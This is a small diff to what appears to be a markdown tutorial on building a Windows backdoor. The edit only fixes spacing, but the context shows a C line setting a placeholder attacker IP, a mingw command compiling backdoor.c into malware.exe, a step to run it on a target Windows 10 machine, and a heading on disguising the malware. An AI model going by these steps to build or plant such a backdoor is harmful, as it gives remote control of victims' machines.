@@ -82,7 +82,8 @@ server_address.sin_addr.s_addr=inet_addr("<attacker-IP machine>");
 ```c
 i686-w64-mingw32-gcc -o malware.exe backdoor.c -lwsock32 -lwininet
 ```
-4.This command will create a Windows executable backdoor.exe that can run on a **Windows 10** system.
+4. This command will create a Windows executable backdoor.exe that can run on a **Windows 10** system.
+
 5. Transfer the **malware.exe** to the target **Windows 10** machine and run it.
 
 ### Disguising your malware
